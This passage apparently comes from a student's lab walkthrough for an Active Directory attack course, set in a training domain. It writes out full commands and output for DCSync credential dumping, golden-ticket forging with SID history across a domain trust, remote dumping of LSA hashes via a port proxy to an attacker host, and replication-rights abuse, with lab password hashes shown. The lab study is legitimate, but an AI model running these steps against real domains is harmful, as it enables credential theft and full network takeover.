        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 16:46:58 (local)
        End Time:   3/12/2025 2:46:58 (local)
        Renew Time: 3/18/2025 16:46:58 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:dbserver31.tech.finance.corp cmd`:
```
Winrs error:Access is denied.
```
❌

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:tech\krbtgt" "exit"`:
```

```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp📌

[SNIP]

[DC] 'tech.finance.corp'🏛️ will be the domain
[DC] 'tech-dc🖥️.tech.finance.corp' will be the DC server
[DC] 'tech\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/11/2025 6:59:11 AM
Object Security ID   : S-1-5-21-1325336202-3661212667-302732393-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: c8c5d0537d1ef5ba43af84fd66dfb498🔑
    ntlm- 0: c8c5d0537d1ef5ba43af84fd66dfb498
    ntlm- 1: f875aad4174d8265844b09ef1ddb6e93
    ntlm- 2: 9e482ed416a6e98116bb264d704fc3a4
    ntlm- 3: 1c649b80c81e407469e39a4feb4ae173
    ntlm- 4: 36ce545b31de928a63d3cec844fdf8c6
    ntlm- 5: 8d205a3d324a50624a141d6aa8b81966
    ntlm- 6: d1ed73ddb4453a4d927b62af59f9b16e
    lm  - 0: b048280988a48668af05934c802b4cba
    lm  - 1: e88f96253c4c1fa0bf2699f9b9c7dca7
    lm  - 2: 381c1dabe1e518585fceeeb5bc7dc686
    lm  - 3: 0d11502c286392d1481bab098600eefb
    lm  - 4: d8b16223b8dce40b1eca3c1c32212e81
    lm  - 5: bb824155cea8e8aff8301e31ade7c0d1
    lm  - 6: 2f841df9adc53fcc71d8a0588bf13181

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 67640f8b9fb1f4e43cc4f4be9107dee2

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECH.FINANCE.CORPkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3a1a8536741cc8565ad4785e6dca779deb438c19d5e91bba596682de9fccf2d3🔑
      aes128_hmac       (4096) : 3956556c7fba9cf17339c2d21319689d
      des_cbc_md5       (4096) : 16df9d62f797232c
    OldCredentials
      aes256_hmac       (4096) : ec906e7b3979eee090adcd80feb6f990aff726fcaf49465cd4e326168c8c2941
      aes128_hmac       (4096) : 950f16f1f357dede948a1b382b11ca4a
      des_cbc_md5       (4096) : 0d493b10df4013a2
    OlderCredentials
      aes256_hmac       (4096) : 9ee3ed0c1e1cf514236e977e3f53b8d0a3f02f16636cd3385380dd1e9879ec4c
      aes128_hmac       (4096) : 1268aaaff3549e49e4c8c618037009ef
      des_cbc_md5       (4096) : 7a94dc8fc4bff1f4

[SNIP]
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp📌

[SNIP]

[DC] 'tech.finance.corp'🏛️ will be the domain
[DC] 'tech-dc🖥️.tech.finance.corp' will be the DC server
[DC] 'tech\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 3/16/2022 3:56:32 AM
Object Security ID   : S-1-5-21-1325336202-3661212667-302732393-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: acfd00282fbe922483c12e049e6e8990🔑
    ntlm- 0: acfd00282fbe922483c12e049e6e8990
    ntlm- 1: 58ce52a1d25fff985d061827fc475535
    ntlm- 2: acfd00282fbe922483c12e049e6e8990
    ntlm- 3: 38038c7899ece8fd5b2670061e52562a
    ntlm- 4: acfd00282fbe922483c12e049e6e8990
    lm  - 0: 57d8b5b97f50b007ce8b47e01ee07464
    lm  - 1: 2f60b78ccdcdfb823c9d5316ca933db0
    lm  - 2: 3a1f73c8e89a46dd4dd5479af7d21605
    lm  - 3: 4f1d3bd9e2e89852bd96a05d5aa97e9e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 894e9ba9f4c91c118b9bfe648cdad5be

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECH.FINANCE.CORPAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165🔑
      aes128_hmac       (4096) : 309331140cd7f06f9bdafb80a23a3a93
      des_cbc_md5       (4096) : 9bcb46852a514aef
    OldCredentials
      aes256_hmac       (4096) : a4956a2aa09644773e0a360b5c905a4d086ef68fd644005e35ab6089de1b5cc6
      aes128_hmac       (4096) : abf97894a1886f2087a18cd77f912345
      des_cbc_md5       (4096) : 0b9b89a4d9a40797
    OlderCredentials
      aes256_hmac       (4096) : d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165
      aes128_hmac       (4096) : 309331140cd7f06f9bdafb80a23a3a93
      des_cbc_md5       (4096) : 9bcb46852a514aef

[SNIP]
```

---

#### Domain Persistence | Golden Ticket + DCSync

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: tech.finance.corp
[*] Showing process : True
[*] Username        : RY2UWDIO
[*] Domain          : QCUPTQMT
[*] Password        : KHJ0WPOJ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4172
[+] LUID            : 0xb54cdf

[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: TECH.FINANCE.CORPAdministrator
[*] Using aes256_cts_hmac_sha1 hash: d9410bd213225049d5beb8cd5fa2eeefc856ffbaa6f35541ac91d6ba2c5ed165
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\administrator'
[*] Target LUID : 11881695
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x143ec18
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/TECH.FINANCE.CORP
  ServiceRealm             :  TECH.FINANCE.CORP🏛️
  UserName                 :  Administrator🎭 (NT_PRINCIPAL)
  UserRealm                :  TECH.FINANCE.CORP
  StartTime                :  3/11/2025 5:27:49 PM
  EndTime                  :  3/12/2025 3:27:49 AM
  RenewTill                :  3/18/2025 5:27:49 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  4a0nPVWsWRtXkvj8fVNiujrd3S57gbr5Q5urdQeYoD0=
  ASREP (key)              :  D9410BD213225049D5BEB8CD5FA2EEEFC856FFBAA6F35541AC91D6BA2C5ED165
```

![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`klist`:
```
Current LogonId is 0:0xb54cdf

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 17:27:49 (local)
        End Time:   3/12/2025 3:27:49 (local)
        Renew Time: 3/18/2025 17:27:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\tech-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\tech-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:tech-dc cmd`:
```
Microsoft Windows [Version 10.0.17763.2510]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀

![tech-dc | administrator](https://custom-icon-badges.demolab.com/badge/tech--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
tech\administrator👤
```

`hostname`:
```
tech-dc🖥️
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TECH\Group Policy Creator Owners            Group            S-1-5-21-1325336202-3661212667-302732393-520 Mandatory group, Enabled by default, Enabled group
TECH\Domain Admins👥                        Group            S-1-5-21-1325336202-3661212667-302732393-512 Mandatory group, Enabled by default, Enabled group✅
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
TECH\Denied RODC Password Replication Group Alias            S-1-5-21-1325336202-3661212667-302732393-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288
```

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

???

Description: ...

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-lsa /patch📌

Domain : TECH🏛️ / S-1-5-21-1325336202-3661212667-302732393📌

RID  : 000001f4 (500)
User : Administrator👤
LM   :
NTLM : acfd00282fbe922483c12e049e6e8990🔑

[SNIP]

RID  : 000001f6 (502)
User : krbtgt👤
LM   :
NTLM : c8c5d0537d1ef5ba43af84fd66dfb498🔑

RID  : 00000454 (1108)
User : studentuser
LM   :
NTLM : 9acca9c6000308085f051a10fe1b5d50

RID  : 00000455 (1109)
User : techservice
LM   :
NTLM : ac25af07540962863d18c6f924ee8ff3

RID  : 00000456 (1110)
User : databaseagent
LM   :
NTLM : 73e728f67a9d8a07983f0b9ce7257fcc

RID  : 00000457 (1111)
User : sqlserversync
LM   :
NTLM : c4fa140adb18d91b7ad9e2bfbc15ab0a

RID  : 000003e8 (1000)
User : TECH-DC$👤
LM   :
NTLM : 0f4f0d4b485a082c384e731e64c700a8🔑

RID  : 00000450 (1104)
User : STUDVM$
LM   :
NTLM : e5c5fa4934a2a058fb61bf3a143d4050

RID  : 00000451 (1105)
User : MGMTSRV$
LM   :
NTLM : 207218a0920d00bbbd4daa22f6e767d3

RID  : 00000452 (1106)
User : TECHSRV30$
LM   :
NTLM : 54c0572a3ddc383be81cdd37b3c8d8a6

RID  : 00000453 (1107)
User : DBSERVER31$
LM   :
NTLM : 8e49721313edefc3bd96634c5920130e

RID  : 0000044f (1103)
User : FINANCE$
LM   :
NTLM : 862f4b5c687b92f464576a572b5214e6

[SNIP]
```

---

### Cross Trust Attacks

#### Cross Trust Attacks - Child Domain `krbtgt` Key Hash Abuse + DCSync

- **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Key Hash from the Child DC for Privilege Escalation**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainGroup "Enterprise Admins" -Domain finance.corp | Select-Object -ExpandProperty objectsid`:
```
S-1-5-21-1712611810-3596029332-2671080496-519📌
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:tech.finance.corp /sid:S-1-5-21-1325336202-3661212667-302732393 /sids:S-1-5-21-1712611810-3596029332-2671080496-519 /aes256:3a1a8536741cc8565ad4785e6dca779deb438c19d5e91bba596682de9fccf2d3 /netbios:tech /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : TECH.FINANCE.CORP🏛️ (tech)
[*] SID            : S-1-5-21-1325336202-3661212667-302732393📌
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-1712611810-3596029332-2671080496-519📌
[*] ServiceKey     : 3A1A8536741CC8565AD4785E6DCA779DEB438C19D5E91BBA596682DE9FCCF2D3
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 3A1A8536741CC8565AD4785E6DCA779DEB438C19D5E91BBA596682DE9FCCF2D3
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : tech.finance.corp

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@tech.finance.corp🏛️'

[*] AuthTime       : 3/11/2025 6:14:50 PM
[*] StartTime      : 3/11/2025 6:14:50 PM
[*] EndTime        : 3/12/2025 4:14:50 AM
[*] RenewTill      : 3/18/2025 6:14:50 PM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x13e557

Cached Tickets: (2)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/11/2025 18:14:50 (local)
        End Time:   3/12/2025 4:14:50 (local)
        Renew Time: 3/18/2025 18:14:50 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/finance-dc🖥️.finance.corp @ FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/11/2025 18:12:27 (local)
        End Time:   3/12/2025 4:12:10 (local)
        Renew Time: 3/18/2025 18:12:10 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\finance-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\finance-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:finance-dc.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2510]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

![finance-dc | administrator](https://custom-icon-badges.demolab.com/badge/finance--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👑
```

`set computername`:
```
COMPUTERNAME=FINANCE-DC🖥️
```
🚩

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-lsa /patch📌

Domain : FINANCE🏛️ / S-1-5-21-1712611810-3596029332-2671080496📌

RID  : 000001f4 (500)
User : Administrator👤
LM   :
NTLM : 58ce52a1d25fff985d061827fc475535🔑

[SNIP]

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 449b7acf3ddeef577218e66df19510de

RID  : 000003e8 (1000)
User : FINANCE-DC$
LM   :
NTLM : d3d27180dea3670873238d414ef9bcbf

RID  : 0000044f (1103)
User : TECH$
LM   :
NTLM : 862f4b5c687b92f464576a572b5214e6

[SNIP]
```
🚩

---

### AD Certificate Services Abuse

#### AD Certificate Services Abuse | ESC1 + ESC3 (with Certify, Rubeus)

- **Find ESC1 Vulnerable Certificate Templates**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Certify.exe cas`:
```
[SNIP]

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=finance,DC=corp'


[*] Root CAs



[*] NTAuthCertificates - Certificates that enable authentication:


[!] Unhandled Certify exception:

System.DirectoryServices.DirectoryServicesCOMException (0x80072030): There is no such object on the server.

[SNIP]
```
❌

`certutil -config - -ping`:
```
No active Certification Authorities found: No more data is available. 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)
CertUtil: -ping command FAILED: 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)
CertUtil: No more data is available.
```
❌

`certutil -dump`:
```
CertUtil: -dump command completed successfully.
```
❌

---

#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'studentuser'}`:
```
```
❌

`Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'sqlserversync'}`:
```
AceQualifier           : AccessAllowed
ObjectDN               : DC=tech,DC=finance,DC=corp
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set📑
ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECH\sqlserversync👤

AceQualifier           : AccessAllowed
ObjectDN               : DC=tech,DC=finance,DC=corp
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes📑
ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECH\sqlserversync👤

AceQualifier           : AccessAllowed
ObjectDN               : DC=tech,DC=finance,DC=corp
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All📑
ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECH\sqlserversync👤
```

???

---
---
